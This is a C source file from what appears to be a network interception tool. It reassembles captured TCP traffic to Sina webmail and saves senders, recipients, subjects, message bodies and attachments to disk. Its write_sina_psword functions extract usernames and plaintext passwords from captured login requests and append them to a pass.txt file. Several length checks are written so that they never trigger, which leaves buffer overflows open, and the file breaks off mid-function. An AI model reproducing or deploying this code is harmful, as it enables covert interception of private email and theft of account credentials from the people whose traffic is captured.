#include "common.h"
//#include <map>

extern void  write_sina_read(Mail_info * mail_info, int new_com);//lihan add
extern int str_to_num(char * size);
extern int strtonum(char * size);

//map<char*, char*> mapstd;

/*
char *clear_kh(char *str, int lens)
{
        int len = lens;
        int flag = 0; 
        char *p1 = NULL;
        char *p2 = NULL;
        char tmp[50] = {0}; 
        char *tmpp = (char *) malloc(len);
        memset (tmpp, 0 , sizeof(tmpp));
	p1 = str;
        while (1)
        {    
                p1 = strstr(p1, "<");
                if(p1 == NULL)
                        break;
                p1 += 1;
                p2 = strstr(p1, ">");
                if (p2 == NULL)
                        break;
                if (flag)
                {    
                        strcat(tmpp, ", ");
                        flag =0;
                }    
                len = p2 - p1;
                memcpy(tmp, p1, len);
                strcat(tmpp, tmp);
                memset(tmp, 0 , sizeof(tmp));
                flag ++;
         }
        return tmpp;
        free(tmpp);
}
*/

int get_datalen(char * data)
{
	char * ii = strstr(data, "Content-Length: ");
	if(ii == NULL)
		return 0;
	ii += 16;
	char * jj = strstr(ii, "\r\n");
	if(jj == NULL)
		return 0;
	int len = jj - ii;
	char str_len[16];
	memset(str_len , 0, 16);
	memcpy(str_len, ii, len);
	int length = 0;
	int i = 0;
	while(i < len)
	{
		length = length * 10 + str_len[i] - 48;
		i++;
	}
	return length;
}

void writefilesina(Mail_info *mail_info)
{
	/*char patternfrom[]="name=\"from\"\r\n\r\n(.*)\r\n.*\r\n.*name=\"to\"";
	char patternto[]="name=\"to\"\r\n\r\n(.*)\r\n.*\r\n.*name=\"cc\"";
	char patternsubject[]="name=\"subj\"\r\n\r\n(.*)\r\n------Web.*\r\n.*name=\"atth0\"; filename=\"\"";
	//char patternsubject[]="name=\"subj\"\r\n\r\n(.*)\r\n.*\r\n.*name=\'atth\"";
	char patterncc[]="name=\"cc\"\r\n\r\n(.*)\r\n.*\r\n.*name=\"bcc\"";
	char patternbcc[]="name=\"bcc\"\r\n\r\n(.*)\r\n.*\r\n.*name=\"subj\"";
	char patterncontent[] = "name=\"msgtxt\"\r\n\r\n(.*)\r\n------Web.*\r\n.*name=\"signatureline";
	char patternattach_id[] = "name=\"att_swf\"\r\n\r\n(.*)\r\n.*\r\n.*name=\"from\"";
	regcompile_1(mail_info->mail_data, patternfrom, mail_info->from,MAX_FROM_LEN);
	regcompile_1(mail_info->mail_data, patternto, mail_info->to,MAX_TO_LEN);
	memset(mail_info->cc,0,MAX_CC_LEN);
	regcompile_1(mail_info->mail_data, patterncc,mail_info->cc,MAX_CC_LEN);
	memset(mail_info->bcc,0,MAX_BCC_LEN);
	regcompile_1(mail_info->mail_data, patternbcc,mail_info->bcc,MAX_BCC_LEN);
	regcompile_1(mail_info->mail_data, patternsubject, mail_info->subject,MAX_SUBJ_LEN);*/
	char patternattach[] = "name=\"att_swf\"\r\n\r\n(.*)\r\n.*\r\n.*name=\"from\"";
	
	char * front,* back;
	front = strstr(mail_info->mail_data, "name=\"from\"\r\n\r\n");
	if(front == NULL) return;
	front += 15;
	back = strstr(front, "\r\n---");
	int len = back-front;
	if(len>MAX_FROM_LEN) len=MAX_FROM_LEN;
	strncpy(mail_info->from,front,len);
	mail_info->from[len]=0;
	//printf("mail_info->from = %s\n", mail_info->from);
	
	front = strstr(mail_info->mail_data, "name=\"to\"\r\n\r\n");
	if(front == NULL) return;
	front += 13;
	back = strstr(front, "\r\n---");
	len = back-front;
	if(len>MAX_TO_LEN) len=MAX_TO_LEN;
	strncpy(mail_info->to,front,len);
	mail_info->to[len]=0;
	//strcpy(mail_info->to, clear_kh(mail_info->to, MAX_TO_LEN));//lzb
	//printf("mail_info->to = %s\n", mail_info->to);

	front = strstr(mail_info->mail_data, "name=\"cc\"\r\n\r\n");
	if(front == NULL) return;
	front += 13;
	back = strstr(front, "\r\n---");
	len = back-front;
	if(len>MAX_CC_LEN) len=MAX_CC_LEN;
	if(len != 0)
	{
		strncpy(mail_info->cc,front,len);
		mail_info->cc[len]=0;
		//strcpy(mail_info->cc, clear_kh(mail_info->cc, MAX_CC_LEN));//lzb
		//printf("mail_info->cc = %s\n", mail_info->cc);
	}

	front = strstr(mail_info->mail_data, "name=\"bcc\"\r\n\r\n");
	if(front == NULL) return;
	front += 14;
	back = strstr(front, "\r\n---");
	len = back-front;
	if(len>MAX_BCC_LEN) len=MAX_BCC_LEN;
	if(len != 0)
	{
		strncpy(mail_info->bcc,front,len);
		mail_info->bcc[len]=0;
		//strcpy(mail_info->bcc, clear_kh(mail_info->bcc, MAX_BCC_LEN));//lzb
		//printf("mail_info->bcc = %s\n", mail_info->bcc);
	}

	front = strstr(mail_info->mail_data, "name=\"subj\"\r\n\r\n");
	if(front == NULL) return;
	front += 15;
	back = strstr(front, "\r\n---");
	len = back-front;
	if(len>MAX_SUBJ_LEN) len=MAX_SUBJ_LEN;
	strncpy(mail_info->subject,front,len);
	mail_info->subject[len]=0;
	
	create_dir(mail_info->save_path,"sina",mail_info->from);//lihan
//	printf("mail_info->subject = %s\n", mail_info->subject);//
	
	//yanglei
//	char ID[MAX_ID_LEN];
//	memset(ID,0,MAX_ID_LEN);
  //      regcompile_1(mail_info->mail_data, patternattach_id, ID, MAX_ID_LEN);
//	printf("patternattach_id = %s\n", patternattach_id);
    //regcompile_1(mail_info->mail_data,patterncontent, mail_info->content, DEFAULT_OK_LEN);
	//printf("mail_info->mail_data = %s\n", mail_info->mail_data);
	     //yanglei

	
	/*printf("mail_info->content = %s\n", mail_info->content);
	char *mail_info_content;
	mail_info_content = (char*)malloc(DEFAULT_OK_LEN);
	memset(mail_info_content , 0 , DEFAULT_OK_LEN);
	strncpy(mail_info_content, mail_info->content, DEFAULT_OK_LEN);
	
	char *f3 = mail_info_content;
	//char *f1=strstr(mail_info->mail_data, "\"subject\":\"");
	if(f3==NULL)
	{
	printf("f1 = NULL\n");
	return;
}
	char *f4;
	f4 = strstr(f1, "--");
	if(f4 != NULL)
	{
	memset(mail_info->content, 0 , DEFAULT_OK_LEN);
	int len = f4 - f3;
	printf("len = %d\n", len);
	strncpy(mail_info->content, f3, len);
}
	printf("mail_info->subject = %s\n", mail_info->content);
	*/
	/////////
	/*char *subject_tmp =NULL;
	int len=0;
	subject_tmp=conv_xml_symbol(mail_info->subject);
	if(subject_tmp ==NULL) return;
	len=strlen(subject_tmp);
	if(len>MAX_SUBJ_LEN) subject_tmp[MAX_SUBJ_LEN]=0;
	strcpy(mail_info->subject,subject_tmp);
	free(subject_tmp);*/
	/////////

	/*char *p1 = mail_info->mail_data;
	char *p2;
	int fd;
	int i = 0;
	char filename[MAX_FN_LEN];
	int flag = 0;

	create_dir(mail_info->save_path, "sina", mail_info->from);
	//chdir(mail_info->save_path);
	mode_t file_mode = S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH;

	while (1)
	{
		p2 = strstr(p1, "form-data; name=\"atth");
		if (p2 == NULL) 
			break;
		p1 = p2;
		p1 += 21;
		p1 = strstr(p1, "\"; filename=\"");
		if(p1==NULL) break;
		p1 += 13;
		if (*p1 == '\"')
		{
			continue;
		}
		p2 = strstr(p1, "\"\r\nContent-Type: ");
		if(p2==NULL) 
		{
			continue;
		}
		i++;
		Attachment *attachment = (Attachment *)malloc((size_t)(sizeof(Attachment)));
		attachment->next = NULL;

		if (!flag) 
		{
			mail_info->attach = attachment;
			flag = 1;
		} 
		else 
		{
			attachment->next = mail_info->attach->next;
			mail_info->attach->next = attachment;
		}
		
		memcpy(attachment->path_of_sender, p1, p2 - p1);
		attachment->path_of_sender[p2 - p1] = 0;
		get_file_name(attachment->path_of_sender, filename);
		//sprintf(attachment->loc_filename, "atta%d_%s", i, filename);
		snprintf(attachment->loc_name, MAX_FN_LEN, "%s", filename);
		snprintf(attachment->loc_filename, MAX_FN_LEN, "attach%d", i);
		p1 = strstr(p1, "\r\n\r\n");
		
		if(!p1) 
		{
			break;
		}
		p1 += 4;
		unsigned int n = mail_info->mail_length - (p1 - mail_info->mail_data);
		p2 = memfind(p1, "Content-Disposition: form-data;", n);

		if (p2 == NULL) 
		{
			return ;
		}

		char str[MAX_PATH_LEN];
		sprintf(str, "%s/%s",mail_info->save_path, attachment->loc_filename);

		fd = open(str, O_RDWR | O_CREAT, file_mode);
		write(fd, p1, p2 - p1);
		close(fd);
		trim_attach(str, 45);
		p1 = p2;
	}*/
	/*char *mail_info_subject;
	mail_info_subject = (char*)malloc(MAX_SUBJ_LEN);
	memset(mail_info_subject , 0 , MAX_SUBJ_LEN);
	strncpy(mail_info_subject,mail_info->subject, MAX_SUBJ_LEN);
	char *f1 = mail_info_subject;
	if(f1==NULL)
	{
		//printf("f1 = NULL\n");
		return;
	}
	char *f2;
	f2 = strstr(f1, "------------");
	if(f2 != NULL)
	{
		memset(mail_info->subject, 0 , MAX_SUBJ_LEN);
		int len = f2 - f1;
		//printf("len = %d\n", len);
		strncpy(mail_info->subject, f1, len);
	}*/

	char *p1=mail_info->mail_data;
	char *p2=NULL;
	char  *tmp1=NULL ,*tmp2=NULL;
	char ID[100*MAX_ID_LEN];
	memset(ID,0,100*MAX_ID_LEN);
	regcompile_1(mail_info->mail_data, patternattach, ID,MAX_ID_LEN);
	/*front = strstr(mail_info->mail_data, "name=\"att_swf\"\r\n\r\n");
	if(front == NULL) return;
	front += 18;
	back = strstr(front, "\r\n---");
	int len = back-front;
	strncpy(ID,front,len);
	mail_info->ID[len]=0;*/

	int  fd;
	char filename[100*MAX_FN_LEN];
//	create_dir(mail_info->save_path,"sina",mail_info->from);//lihan
	
	char writepath[MAX_PATH_LEN];
       // attach_info = attach_tab.head->next;
	int  i=0;
	int flag=0;
	
	char *c1 = strstr(ID,"{\"id\":\"");
	
	p1 = mail_info->mail_data;
	mode_t file_mode = S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH;

	while (1) 
	{
		p2 = strstr(p1, "\",\"name\":\"");
		if (p2 == NULL) 
			break;
		p1 = p2;
		p1 += 10;
	//	p2 = strstr(p1, "\",\"type\":\"");
		p2 = strstr(p1, "\",\"size\":\"");//lihan
		if(p2 == NULL) 
		    continue;
			
		i++;		
		Attachment *attachment = (Attachment *)malloc((size_t)(sizeof(Attachment)));
		attachment->next = NULL;
		if (!flag) 
		{
			mail_info->attach = attachment;
			flag = 1;
		} 
		else 
		{
			attachment->next = mail_info->attach->next;
			mail_info->attach->next = attachment;
		}
		memcpy(attachment->path_of_sender, p1, p2 - p1);
		attachment->path_of_sender[p2 - p1] = 0;

		get_file_name(attachment->path_of_sender, filename);
		htmldecode_full(filename, filename);

		//sprintf(attachment->loc_filename, "atta%d_%s", i, filename);
		snprintf(attachment->loc_name, MAX_FN_LEN, "%s", filename);
		snprintf(attachment->loc_filename, MAX_FN_LEN, "attach%d", i);
		char str[MAX_PATH_LEN];
		sprintf(str, "%s/%s",mail_info->save_path, attachment->loc_name);//lihan  2017.3.27

		if(c1 == NULL)
		{
			return ;
		}
		char *c2 = NULL;
		char attach_id[MAX_ID_LEN];
		if(c1 != NULL)
		{
			c1+=7;
			c2 = strstr(c1, "\",\"name\"");
			if(c2 == NULL)
			{
				return ;
			}
			memset(attach_id, 0, MAX_ID_LEN);
			memcpy(attach_id, c1, c2 - c1);
			c1 = strstr(c2, "{\"id\":\"");
		}
		
		Mail_info *mail_info1;
		mail_info1 = mail_tab.head->next;
			
		while(mail_info1 != NULL)
		{
			if(!strcmp(mail_info1->ID_str, attach_id))
			{
				link(mail_info1->path_of_here, str);
				unlink(mail_info1->path_of_here);
				break;
			}
			
			mail_info1 = mail_info1->next;
		}
	}

	mail_info->num_of_attach = i;
	//regcompile_2(p1, patterncontent, &mail_info->content);
	front = strstr(mail_info->mail_data, "name=\"msgtxt\"\r\n\r\n");
	if(front == NULL) return;
	front += 17;
	back = strstr(front, "\r\n---");
	len = back-front;
	if(len != 0)
	{
		mail_info->content = (char*)malloc(len);
		memset(mail_info->content, 0, len);
		memcpy(mail_info->content, front, len);
		char *tmp_str;
		tmp_str = clear_html_tag(mail_info->content);
		free(mail_info->content);
		mail_info->content = tmp_str;
		tmp_str = NULL;
		//printf("mail_info->content : %s\n", mail_info->content);
	}
	write_to_file(mail_info);
}

void get_sina_vip_from_subject(Mail_info *mail_info)
{
	char *p1 ,*p2;
	int flag;
	p1=strstr(mail_info->mail_data,"SINA_USER=");
	if(!p1) return ;
	p1 += 10;
	p2 = p1;
	while (*p2 != ';'){
		p2++;
		flag = p2 -p1;
		if(flag == 50) return;
	}
	strncpy(mail_info->from,p1,flag);
	mail_info->from[flag]=0;
	strcat(mail_info->from,"@vip.sina.com");
	p1 = strstr(p1,"\"subj\"");
	if(!p1) return ;
	p1 +=10;
	p2 = strstr(p1,"\r\n---");
	if(!p2) return;
	flag=p2-p1;
	if(flag>MAX_SUBJ_LEN) flag=MAX_SUBJ_LEN;
	strncpy(mail_info->subject,p1,flag);
	mail_info->subject[flag] = 0;
}

void writefilesinvip( Mail_info *mail_info)
{
	//printf("function:writefilesinvip\n");
	char patternto[]="name=\"to\"\r\n\r\n(.*)\r\n.*\r\n.*name=\"cc\"";
	char patterncontent[]="name=\"msgtxt\"\r\n\r\n(.*)\r\n.*\r\n.*name=\"youxj\"";
	char patterncc[]="name=\"cc\"\r\n\r\n(.*)\r\n.*\r\n.*name=\"bcc\"";
	char patternbcc[]="name=\"bcc\"\r\n\r\n(.*)\r\n.*\r\n.*name=\"subj\"";
	regcompile_1(mail_info->mail_data,patternto,mail_info->to,MAX_TO_LEN);
	memset(mail_info->cc,0,MAX_CC_LEN);
	regcompile_1(mail_info->mail_data,patterncc,mail_info->cc,MAX_CC_LEN);
	memset(mail_info->bcc,0,MAX_BCC_LEN);
	regcompile_1(mail_info->mail_data,patternbcc,mail_info->bcc,MAX_BCC_LEN);
	get_sina_vip_from_subject(mail_info);
	///////
	/*char *subject_tmp =NULL;
	int  len=0;
	subject_tmp=conv_xml_symbol(mail_info->subject);
	if(subject_tmp ==NULL) return;
	len=strlen(subject_tmp);
	if(len>MAX_SUBJ_LEN) subject_tmp[MAX_SUBJ_LEN]='\0';
	strcpy(mail_info->subject,subject_tmp);
	free(subject_tmp);*/
	////////
	char *p1=mail_info->mail_data;
	char *p2=NULL;
	int  fd;
	int  flag=0;
	int  i=0;
	char filename[MAX_FN_LEN];
    
	create_dir(mail_info->save_path,"sina",mail_info->from);
	//chdir(mail_info->save_path);
	mode_t file_mode = S_IRUSR |S_IWUSR|S_IRGRP|S_IROTH;

	while(1)
    {
		p2=strstr(p1,"filename=\"");
		if(!p2) break;
		p1=p2;
		p1 += 10;
		if(*p1=='\"') continue ;
		p2=strstr(p1,"\"\r\n");
		if(!p2) break;
		i++;
		Attachment *attachment=(Attachment *)malloc(sizeof(Attachment));
		attachment->next=NULL;
		if(!flag){
			mail_info->attach=attachment;
			flag = 1;
		}else {
			attachment->next = mail_info->attach->next;
			mail_info->attach->next = attachment;
		}
		memcpy(attachment->path_of_sender,p1,p2-p1);
		attachment->path_of_sender[p2-p1]=0;

		get_file_name(attachment->path_of_sender,filename);
		//sprintf(attachment->loc_filename,"attach%d_%s",i,filename);
		snprintf(attachment->loc_name, MAX_FN_LEN, "%s", filename);
		snprintf(attachment->loc_filename, MAX_FN_LEN, "attach%d", i);
           
		p1 = strstr(p1,"\r\n\r\n");
		if(!p1) break;
		p1 +=4;
		unsigned int n =mail_info->mail_length-(p1-mail_info->mail_data);
		p2 = memfind(p1,"Content-Disposition:",n);
		if (p2==NULL)   return ;
		char str[MAX_PATH_LEN];
		sprintf(str,"%s/%s",mail_info->save_path,attachment->loc_filename);
		fd = open (str ,O_RDWR|O_CREAT,file_mode);
		write(fd,p1,p2-p1);
		close(fd);
		trim_attach(str,45);
		p1=p2;
	}
	mail_info->num_of_attach = i;
	regcompile_2(p1,patterncontent,&mail_info->content);

	if (mail_info->content != NULL) {
		char *tmp_str;
		tmp_str = clear_html_tag(mail_info->content);
		free(mail_info->content);
		mail_info->content = tmp_str;
		tmp_str = NULL;
	}
	write_to_file(mail_info);
}

int analyse_sina_content(Mail_info *mail_info,char *data, unsigned int datalen,struct tcphdr *tcp,int is_b_s)
{
	unsigned int seq = ntohl(tcp->seq);
	int  off_seq;
	int  range;
	char http_ok_head[18] = "HTTP/1.1 200 OK\r\n";

	if (is_b_s)
	{
		if (!mail_info->is_complished) {
			if (mail_info->mail_length == 0) {
				mail_info->mail_length = 5000;
				mail_info->mail_data = (char *)malloc(5000);
				if(mail_info->mail_data ==NULL)
				{
					return -1;
				}
				memset(mail_info->mail_data,0,5000);
				mail_info->start_seq = seq;
			}
			if(mail_info->mail_length == 5000) {
				int  len;
				char *tmp;
				len = get_http_length(data);
				if (len > 0) {
					mail_info->mail_length += len;
					tmp =(char*)malloc(mail_info->mail_length);
					if(tmp ==NULL)
					{
						return -1;
					}
					memset(tmp,0,mail_info->mail_length);
					memcpy(tmp,mail_info->mail_data,5000);
					free(mail_info->mail_data);
					mail_info->mail_data = tmp;
				}
			}
			off_seq = seq - mail_info->start_seq;
			range=off_seq+datalen;
			if(range>mail_info->mail_length)
			{
				return -1;
			}
			memcpy(mail_info->mail_data+off_seq,data,datalen);
		}
	}
	else if(!strncmp(data, http_ok_head, 15)) 
	{
		get_time(data, mail_info->sent_time);
		mail_info->is_complished = 1;
		writefilesina(mail_info);
		del_mail_node(mail_info);
	}
	return 0;
}
//yanglei
void write_sinacn_file(Mail_info *mail_info)
{
	//printf("function : write_sinacn_file\n");
	char patternfrom[]="name=\"from\"\r\n\r\n(.*)\r\n.*\r\n.*name=\"to\"";
	char patternto[]="name=\"to\"\r\n\r\n(.*)\r\n.*\r\n.*name=\"cc\"";
	char patternsubject[]="name=\"subj\"\r\n\r\n(.*)\r\n------Web.*\r\n.*name=\"atth.\"; filename=\"\"";
	char patterncc[]="name=\"cc\"\r\n\r\n(.*)\r\n.*\r\n.*name=\"bcc\"";
	char patternbcc[]="name=\"bcc\"\r\n\r\n(.*)\r\n.*\r\n.*name=\"subj\"";
	char patterncontent[] = "name=\"msgtxt\"\r\n\r\n(.*)\r\n------Web.*name=\"signatureline\"";
	char patternattach[] = "name=\"att_swf\"\r\n\r\n(.*)\r\n.*\r\n.*name=\"from\"";
	//printf("123");
	regcompile_1(mail_info->mail_data, patternfrom, mail_info->from,MAX_FROM_LEN);
	regcompile_1(mail_info->mail_data, patternto, mail_info->to,MAX_TO_LEN);
	memset(mail_info->cc,0,MAX_CC_LEN);
	regcompile_1(mail_info->mail_data, patterncc,mail_info->cc,MAX_CC_LEN);
	memset(mail_info->bcc,0,MAX_BCC_LEN);
	regcompile_1(mail_info->mail_data, patternbcc,mail_info->bcc,MAX_BCC_LEN);
	regcompile_1(mail_info->mail_data, patternsubject, mail_info->subject,MAX_SUBJ_LEN);
	char *mail_info_subject;
	mail_info_subject = (char*)malloc(MAX_SUBJ_LEN);
	memset(mail_info_subject , 0 , MAX_SUBJ_LEN);
	strncpy(mail_info_subject,mail_info->subject, MAX_SUBJ_LEN);
	char *f1 = mail_info_subject;
	//char *f1=strstr(mail_info->mail_data, "\"subject\":\"");
	if(f1==NULL)
	{
		//printf("f1 = NULL\n");
		return;
	}
	char *f2;
	f2 = strstr(f1, "------------");
	if(f2 != NULL)
	{
		memset(mail_info->subject, 0 , MAX_SUBJ_LEN);
		int len = f2 - f1;
		//printf("len = %d\n", len);
		strncpy(mail_info->subject, f1, len);
	}
	//printf("mail_info->subject = %s\n", mail_info->subject);

	char *p1=mail_info->mail_data;
	char *p2=NULL;
	char  *tmp1=NULL ,*tmp2=NULL;
	int len;
	char ID[100*MAX_ID_LEN];
	memset(ID,0,100*MAX_ID_LEN);
	regcompile_1(mail_info->mail_data, patternattach, ID,MAX_SUBJ_LEN);
	int  fd;
	char filename[100*MAX_FN_LEN];
	create_dir(mail_info->save_path,"sinacn",mail_info->from);
	char writepath[MAX_PATH_LEN];
       // attach_info = attach_tab.head->next;
	int  i=0;
	int flag=0;
	
	/*char *SWEBAPPSESSID;
	p1 = strstr(mail_info->mail_data,"SWEBAPPSESSID=");	
	if(p1 == NULL)
	{
	printf("p1 == NULL\n");
	return;
}
	p1+=14;
	p2 = strstr(p1, "\r\n");
	if(p2 == NULL)
	{
	return ;
}
	SWEBAPPSESSID = (char*)malloc(len);
	len = p2 - p1;
	memset(SWEBAPPSESSID, 0, len);
	memcpy(SWEBAPPSESSID, p1, p2 - p1);*/
	
	//printf("ID = %s\n", ID);
	char *c1 = strstr(ID,"{\"id\":\"");
	
	p1 = mail_info->mail_data;
	mode_t file_mode = S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH;

	while (1) 
	{
		p2 = strstr(p1, "\",\"name\":\"");
		if (p2 == NULL) 
			break;
		p1 = p2;
		p1 += 10;
		p2 = strstr(p1, "\",\"type\":\"");
		if(p2 == NULL) 
            continue;
		i++;		
		Attachment *attachment = (Attachment *)malloc((size_t)(sizeof(Attachment)));
		attachment->next = NULL;
		if (!flag) 
		{
			mail_info->attach = attachment;
			flag = 1;
		} 
		else 
		{
			attachment->next = mail_info->attach->next;
			mail_info->attach->next = attachment;
		}
		memcpy(attachment->path_of_sender, p1, p2 - p1);
		attachment->path_of_sender[p2 - p1] = 0;

		get_file_name(attachment->path_of_sender, filename);
		htmldecode_full(filename, filename);

		//sprintf(attachment->loc_filename, "atta%d_%s", i, filename);
		snprintf(attachment->loc_name, MAX_FN_LEN, "%s", filename);
		snprintf(attachment->loc_filename, MAX_FN_LEN, "attach%d", i);
		char str[MAX_PATH_LEN];
		sprintf(str, "%s/%s",mail_info->save_path, attachment->loc_filename);

		if(c1 == NULL)
		{
			return ;
		}
		char *c2 = NULL;
		char attach_id[MAX_ID_LEN];
		if(c1 != NULL)
		{
			c1+=7;
			c2 = strstr(c1, "\",\"name\"");
			if(c2 == NULL)
			{
				return ;
			}
			memset(attach_id, 0, MAX_ID_LEN);
			memcpy(attach_id, c1, c2 - c1);
			c1 = strstr(c2, "{\"id\":\"");
		}
			
		Mail_info *mail_info1;
		mail_info1 = mail_tab.head->next;
		while(mail_info1 != NULL)
		{
			if(!strcmp(mail_info1->ID_str, attach_id))
			{
				link(mail_info1->path_of_here,str);
				unlink(mail_info1->path_of_here);
				break;
			}
            
			mail_info1 = mail_info1->next;
		}
        
		mail_info->num_of_attach = i;
	}

	p1=mail_info->mail_data;
	regcompile_2(p1, patterncontent, &mail_info->content);
	//printf("mail_info->content = %s\n",mail_info->content);
	if (mail_info->content != NULL) 
	{
		char *tmp_str;
		tmp_str = clear_html_tag(mail_info->content);
		free(mail_info->content);
		mail_info->content = tmp_str;
		tmp_str = NULL;
	}
	write_to_file(mail_info);
}

//yanglei
/*int analyse_sinacn_content(Mail_info *mail_info,char *data,unsigned int datalen,struct tcphdr *tcp,int is_b_s)
{
	//printf("function: analyse_sinacn_content\n");
	unsigned int seq=ntohl(tcp->seq);
	int off_seq=seq-mail_info->start_seq;
	int range;
	char http_ok_head[18]="HTTP/1.1 200 OK\r\n";
	
	//printf("%s\n", data);
	
	if(is_b_s)
	{
		//printf("1111111111\n");
		if(!mail_info->is_complished)
		{
			if (mail_info->mail_length == 0) 
			{
				mail_info->mail_length = 5000;
				mail_info->mail_data = (char *)malloc(5000);
				if(mail_info->mail_data==NULL)
				{
					return -1;
				}
				memset(mail_info->mail_data,0,5000);
				mail_info->start_seq = seq;
			}
			if(mail_info->mail_length == 5000) 
			{
				int len;
				char *tmp;
				len = get_http_length(data);
				if (len > 0) 
				{
					mail_info->mail_length += len;
					tmp = (char *)malloc(mail_info->mail_length);
					if(tmp ==NULL)
					{
						return -1;
					}
					memset(tmp,0,mail_info->mail_length);
					memcpy(tmp,mail_info->mail_data,5000);
					free(mail_info->mail_data);
					mail_info->mail_data = tmp;
				}
			}
			off_seq = seq - mail_info->start_seq;
			range=off_seq+datalen;
			if(range>mail_info->mail_length)
			{
				return -1;
			}
			memcpy(mail_info->mail_data+off_seq,data,datalen);
		}
	}
	else 
		if(!strncmp(data,http_ok_head,15))
	{
		//printf("2222222222222\n");
		get_time(data, mail_info->sent_time);
		mail_info->is_complished = 1;
		write_sinacn_file(mail_info);
		del_mail_node(mail_info);
	}
	return 0;
}
*/
/////////////////////////////  sina vip  /////////////
int analyse_sina_content_vip(Mail_info *mail_info, char *data,unsigned int datalen,struct tcphdr *tcp,int is_b_s)
{
	unsigned int seq = ntohl(tcp->seq);
	int  off_seq;
	int  range;
	char http_ok_head[18]= "HTTP/1.1 200 OK\r\n";

	if(is_b_s)
	{
		if(!mail_info->is_complished){
			if(mail_info->mail_length == 0) {
				mail_info->mail_length = 5000;
				mail_info->mail_data = (char *)malloc(5000);
				if(mail_info->mail_data ==NULL){
					return -1;
				}
				memset(mail_info->mail_data,0,5000);
				mail_info->start_seq = seq;
			}
			if(mail_info->mail_length == 5000){
				int len;
				char *tmp;
				len = get_http_length(data);
				if(len>0){
					mail_info->mail_length +=len;
					tmp = (char *)malloc(mail_info->mail_length);
					if(tmp ==NULL){
						return -1;
					}
					memset(tmp,0,mail_info->mail_length);
					memcpy(tmp,mail_info->mail_data,5000);
					free(mail_info->mail_data);
					mail_info->mail_data = tmp;
				}
			}
			off_seq = seq - mail_info->start_seq;
			range = off_seq +datalen;
			if(range>mail_info->mail_length){
				return -1;
			}
			memcpy(mail_info->mail_data+off_seq,data,datalen);
		}
	}
	else if(!strncmp(data, http_ok_head,15))
	{
		get_time(data,mail_info->sent_time);
		mail_info->is_complished =1;
		writefilesinvip(mail_info);
		del_mail_node(mail_info);
	}
	return 0;
}
/////////////////////////////// sina vip //////////////////////
/*void write_sina_psword(Mail_info *mail_info)
{
	char *p1,*p2;
	char username[MAX_UN_LEN],passwd[MAX_PW_LEN];
	int range;
	p1=mail_info->mail_data;
	p1 = strstr(p1,"\r\n\r\nlogintype");
    if (p1) {   //sina.com
		p1=strstr(p1,"uid&u="); 
		if(!p1)
		return;
		p1+=6;
		p2=strstr(p1,"&psw=");
		if(!p2)
		return;
		range = p2 -p1 ;
        if ( range >= MAX_UN_LEN && range <= 0) return;
		strncpy(username,p1,p2-p1);
		username[p2-p1]=0;
		strcat(username,"@sina.com");
		p1=p2;
		p1+=5;
		p2=strstr(p1,"&btnlogin");
		if(!p2)
	    return;
		range = p2 -p1;
		if( range >= MAX_PW_LEN && range <= 0) return ;
		strncpy(passwd,p1,p2-p1);
		passwd[p2-p1]=0;
}
	else {  //sina vip
		p1= strstr(mail_info->mail_data,"\r\n\r\nuser=");
		if(p1){
		p1+=9;
		p2=strstr(p1,"&domain=");
		if(!p2) return;
		range = p2 -p1 ;
		if ( range >= MAX_UN_LEN && range <= 0) return ;
		strncpy(username,p1,p2-p1);
		username[p2-p1]=0;
		strcat(username,"@vip.sina.com");
		p1=p2;
        p1=strstr(p1,"&pass=");
		if(!p1) return;
		p1+=6;
		p2= strstr(p1,"&btnviplogin=");
		if(!p2) return;
		range = p2 - p1 ;
		if ( range >= MAX_PW_LEN && range <=0) return;
		strncpy(passwd,p1,p2-p1);
		passwd[p2-p1]=0;
}
		else {
		p1 = strstr(mail_info->mail_data,"\r\n\r\nu=");
		if(!p1) return ;
		p1+=6;
		p2 = strstr(p1,"&domain=");
		if(!p2) return;
		range = p2 -p1 ;
		if( range >= MAX_UN_LEN && range <=0) return;
		strncpy(username,p1,p2-p1);
		username[p2-p1]=0;
		strcat(username,"@vip.sina.com");
		p1=p2;
		p1 = strstr(p1,"&psw=");
		if(!p1) return;
		p1+=5;
	    strcpy(passwd,p1);
}

}
	FILE *fp;
	chdir(mail_data_path);
	fp=fopen("pass.txt","a+");
	if(fp==NULL) return;
	fprintf(fp,"\nusername=%s\npassword=%s\n",username,passwd);
	fclose(fp);
}*/
void write_sina_psword_common(Mail_info *mail_info)  //hao123  mail.sina.com
{
	char *p1, *p2;
	int range;
	int len;
	p1 = mail_info->mail_data;
	p1 = strstr(p1,"&u=");
	if (!p1) return ;
	p1+=3;
	p2 = strstr(p1 ,"&");
	if(!p2) return;
	range = p2 -p1;
	if(range >= MAX_UN_LEN-9 && range <=0 ) return;
	strncpy(mail_info->username, p1, range);
	mail_info->username[range]=0;
	len=strlen(mail_info->username);
	while(len && mail_info->username[len] != '@')
	{
		len--;
	}
	if(!len){
		strcat(mail_info->username,"@sina.com");
	}
	p1 = strstr(p1 ,"&psw=");
	if(!p1) return ;
	p1+=5;
	p2 = strstr(p1,"&");
	if(!p2) return ;
	range = p2 -p1;
	if(range>=MAX_PW_LEN && range <=0) return ;
	strncpy(mail_info->passwd,p1,range);
	mail_info->passwd[range]=0;

	write_xml(mail_info);

	FILE *fp;
	char passpath[MAX_PATH_LEN];
	sprintf(passpath,"%s/pass.txt",mail_data_path);
	//chdir(mail_data_path);
	fp = fopen(passpath,"a+");
	if(fp==NULL) return;
	fprintf(fp,"\nusername=%s\npassword=%s\n",mail_info->username,mail_info->passwd);
	fclose(fp);
}
void write_sina_psword_vip(Mail_info * mail_info)
{
	char *p1,*p2;
	int range;
	p1 = mail_info->mail_data;
	p1 = strstr(p1,"\r\n\r\nuser=");
	if(p1){
		p1+=9;
		p2 = strstr(p1,"&domain=");
		if(!p2) return;
		range = p2-p1;
		if (range>=MAX_UN_LEN && range <=0) return;
		strncpy(mail_info->username,p1,range);
		mail_info->username[range]=0;
		strcat(mail_info->username,"@vip.sina.com");
		p1 = p2 ;
		p1 = strstr(p1,"&pass=");
		if(!p1) return;
		p1 +=6 ;
		p2 = strstr(p1,"&");
		if(!p2) return;
		range = p2-p1;
		if(range>=MAX_PW_LEN && range <=0) return;
		strncpy(mail_info->passwd,p1,range);
		mail_info->passwd[range]=0;
	}else {
		p1= strstr(mail_info->mail_data,"\r\n\r\nu=");
		if(!p1) return;
		p1 +=6;
		p2 =strstr(p1,"&");
		if(!p2) return;
		range = p2 -p1;
